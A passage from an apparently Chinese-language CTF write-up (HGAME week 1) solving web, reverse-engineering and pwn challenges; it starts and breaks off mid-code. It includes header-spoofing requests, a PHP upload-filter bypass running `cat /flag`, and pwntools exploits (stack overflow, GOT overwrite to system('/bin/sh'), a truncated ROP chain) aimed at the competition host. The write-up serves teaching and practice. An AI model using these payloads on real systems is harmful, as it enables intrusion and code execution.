class="keyword">function</span> (<span class="params">k</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> l = <span class="title class_">String</span>(k)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/=+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">          <span class="keyword">var</span> m = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0x0</span>, o, p, q = <span class="number">0x0</span>; p = l[<span class="string">&#x27;charAt&#x27;</span>](q++); ~p &amp;&amp; (o = n % <span class="number">0x4</span> ? o * <span class="number">0x40</span> + p : p, n++ % <span class="number">0x4</span>) ? m += <span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span> &amp; o &gt;&gt; (-<span class="number">0x2</span> * n &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">            p = h[<span class="string">&#x27;indexOf&#x27;</span>](p);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> m;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;());</span><br><span class="line">      b[<span class="string">&#x27;fqlkGn&#x27;</span>] = <span class="keyword">function</span> (<span class="params">g</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = <span class="title function_">atob</span>(g);</span><br><span class="line">        <span class="keyword">var</span> j = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0x0</span>, l = h[<span class="string">&#x27;length&#x27;</span>]; k &lt; l; k++) &#123;</span><br><span class="line">          j += <span class="string">&#x27;%&#x27;</span> + (<span class="string">&#x27;00&#x27;</span> + h[<span class="string">&#x27;charCodeAt&#x27;</span>](k)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(j);</span><br><span class="line">      &#125;;</span><br><span class="line">      b[<span class="string">&#x27;iBPtNo&#x27;</span>] = &#123;&#125;;</span><br><span class="line">      b[<span class="string">&#x27;CFrzVf&#x27;</span>] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> f = b[<span class="string">&#x27;iBPtNo&#x27;</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (f === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      e = b[<span class="string">&#x27;fqlkGn&#x27;</span>](e);</span><br><span class="line">      b[<span class="string">&#x27;iBPtNo&#x27;</span>][c] = e;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      e = f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="title function_">atob</span>(<span class="title function_">b</span>(<span class="string">&#x27;\x30\x78\x30&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在控制台中运行，弹窗内容即为flag：<code>hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;</code>。</p><p>​    </p><h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><blockquote><p>学校通知放寒假啦，兔兔兴高采烈的打算购买回家的车票，这时兔兔发现成为购票网站的会员账户可以省下一笔money……</p><p>想成为会员也很简单，只需要一点点HTTP的知识……等下，HTTP是什么，可以吃吗</p></blockquote><p>考察HTTP请求头中的User-Agent、Cookie、来源(Referer)和本地访问(X-Forwarded-For)。</p><p>需依次满足：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">JSON</span><br><span class="line">username=luckytoday</span><br><span class="line">password=happy123</span><br></pre></td></tr></table></figure><p>以JSON格式请求登录即可：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:31450</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Cute-Bunny</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bunnybunnybunny.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>code=Vidar</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;luckytoday&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;happy123&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>返回flag值：<code>hgame&#123;H0w_ArE_Y0u_T0day?&#125;</code>。</p><p>​    </p><h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><blockquote><p>刚加入Vidar的兔兔还认不清协会成员诶，学长要求的答对100次问题可太难了，你能帮兔兔写个脚本答题吗？</p></blockquote><p>查看源码：</p><p><code>&lt;!-- Hint: https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js --&gt;</code></p><p>访问发现为页面问题的答案，以list方式提取数据。</p><p>另在js文件中搜索发现页面的3个路由：</p><p>获取问题：<code>/api/getQuestion</code>，验证答案：<code>/api/verifyAnswer</code>，获取分数：<code>/api/getScore</code>。</p><p>python脚本模拟页面100次回答：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;ba1van4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;intro&quot;</span>: <span class="string">&quot;21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉&quot;</span>,</span><br><span class="line">        <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;</span>,</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://ba1van4.icu&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> data:</span><br><span class="line">    dic[k[<span class="string">&quot;intro&quot;</span>]] = k[<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:xxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    r = s.get(url+<span class="string">&#x27;/api/getQuestion&#x27;</span>)</span><br><span class="line">    intro = json.loads(r.text)[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">    <span class="comment">#print(intro)</span></span><br><span class="line">    r = s.post(url+<span class="string">&#x27;/api/verifyAnswer&#x27;</span>, data=&#123;<span class="string">&#x27;id&#x27;</span>:dic[intro]&#125;)</span><br><span class="line">    r = s.get(url+<span class="string">&#x27;/api/getScore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>运行得到100次循环后的结果：<code>&#123;&quot;message&quot;:&quot;hgame&#123;Guess_who_i_am^Happy_Crawler&#125;&quot;&#125;</code>。</p><p>​    </p><h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><blockquote><p>登陆了之前获取的会员账号之后，兔兔想找一张自己的可爱照片，上传到个人信息的头像中 :D</p><p>不过好像可以上传些奇怪后缀名的文件诶 XD</p></blockquote><p>图片文件上传，抓包尝试，文件名存在关键字黑名单，包括 <code>php/phtml/ini/htaccess</code> 等；</p><p>测试发现可以大小写绕过，将文件名后缀修改为 <code>Php</code>，内容修改为 <code>&lt;?=`cat /flag`;</code>，上传 <code>1.Php</code>，访问即可得到flag：<code>hgame&#123;Unsave_F1L5_SYS7em_UPL0ad!&#125;</code>。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="test-your-IDA"><a href="#test-your-IDA" class="headerlink" title="test your IDA"></a>test your IDA</h3><blockquote><p>签到</p></blockquote><p>IDA打开查看字符串有flag：<code>hgame&#123;te5t_y0ur_IDA&#125;</code>。</p><p>​    </p><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><blockquote><p>非常简单的汇编</p></blockquote><p>关键操作在 <code>xor eax, 33h</code>，将结果异或0x33即可还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line">flag = [k^<span class="number">0x33</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;welc0me_t0_re_wor1d!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><blockquote><p>easyenc</p></blockquote><p>代码逻辑为逐字符先异或0x32后减86，逆向还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">4</span>, <span class="number">255</span>, <span class="number">253</span>,   <span class="number">9</span>,   <span class="number">1</span>, <span class="number">243</span>, <span class="number">176</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>, </span><br><span class="line">  <span class="number">240</span>, <span class="number">173</span>,   <span class="number">7</span>,   <span class="number">6</span>,  <span class="number">23</span>,   <span class="number">5</span>, <span class="number">235</span>,  <span class="number">23</span>, <span class="number">253</span>,  <span class="number">23</span>, </span><br><span class="line">  <span class="number">234</span>,   <span class="number">1</span>, <span class="number">238</span>,   <span class="number">1</span>, <span class="number">234</span>, <span class="number">177</span>,   <span class="number">5</span>, <span class="number">250</span>,   <span class="number">8</span>,   <span class="number">1</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">172</span>, <span class="number">236</span>,   <span class="number">1</span>, <span class="number">234</span>, <span class="number">253</span>, <span class="number">240</span>,   <span class="number">5</span>,   <span class="number">7</span>,   <span class="number">6</span>, </span><br><span class="line">  <span class="number">249</span>]</span><br><span class="line"></span><br><span class="line">flag = [((k+<span class="number">86</span>)^<span class="number">0x32</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="a-cup-of-tea"><a href="#a-cup-of-tea" class="headerlink" title="a_cup_of_tea"></a>a_cup_of_tea</h3><blockquote><p>兔兔的家人都爱喝茶，所以兔兔带了些茶叶回去</p></blockquote><p>魔改了delta为 <code>0xABCDEF23</code> 的Tea算法，用解密算法还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = [<span class="number">0x2E63829D</span>, <span class="number">0xC14E400F</span>, <span class="number">0x9B39BFB9</span>, <span class="number">0x5A1F8B14</span>, <span class="number">0x61886DDE</span>, <span class="number">0x6565C6CF</span>, <span class="number">0x9F064F64</span>, <span class="number">0x236A43F6</span>, <span class="number">0x7D6B</span>]</span><br><span class="line">    cc = [long_to_bytes(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x23456789</span>, <span class="number">0x34567890</span>, <span class="number">0x45678901</span>]</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">        d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">        flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>]+long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(c[-<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><blockquote><p>兔兔把自己行李箱的密码用一种编码写在了纸条上，但他忘了怎么解密，你能帮帮他吗？</p></blockquote><p>代码逻辑为将低4位和高4位分别取出存入 <code>v4[2*i]</code> 和 <code>v4[2*i+1]</code>，提取比对字符串 <code>dword_403000</code>，逆向还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>((c[<span class="number">2</span>*i+<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + c[<span class="number">2</span>*i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>pwn签到，直接 <code>cat flag</code> 得flag。</p><p>​    </p><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>简单栈溢出到 <code>b4ckd0or()</code> 函数上，特别的一点是用 <code>close(1)</code> 关闭了标准输出，可以用 <code>execv 1&gt;&amp;0</code> 将标准输出重定向到标准输入，因为默认打开一个终端后，0/1/2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31066</span>)</span><br><span class="line"></span><br><span class="line">b4ckd0or=<span class="number">0x401176</span></span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(b4ckd0or)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><blockquote><p>兔兔在买高铁票时想要选一个好座位。</p><p>HINTS:</p><p>数组下标的检查好像少了点东西</p></blockquote><p>由代码逻辑知可以写入bss段，只限制了上限未限制下限，使用负数可打GOT表内容。覆盖 <code>exit()</code> 的GOT表为 <code>main()</code> 使程序循环，再覆盖 <code>puts()</code> 的GOT表泄露 <code>puts()</code> 地址计算得到libc基地址，最后覆盖 <code>puts()</code> 的GOT表为 <code>system(&quot;/bin/sh\x00&quot;)</code>。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30831</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=elf.sym.main</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-6&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(p64(main))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-9&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base=puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-9&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(base+libc.sym.system))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><blockquote><p>HINTS:</p><p>标题就是考点捏，没思路的可以按照标题查一查</p><p>觉得溢出的不够多？那就先找个地方把ROP链写进去，再把栈迁移过去执行吧</p></blockquote><p>标题表明需orw，但开启了沙盒禁用了 <code>execve()/execveat()</code>，<code>read()</code> 读的字节数足以用ROP链泄露libc，但溢出字节0x28不足以执行orw，需先做栈迁移后，再执行orw。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30153</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">main=elf.sym.main</span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(elf.sym.main)</span><br><span class="line">r.send(pl)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span 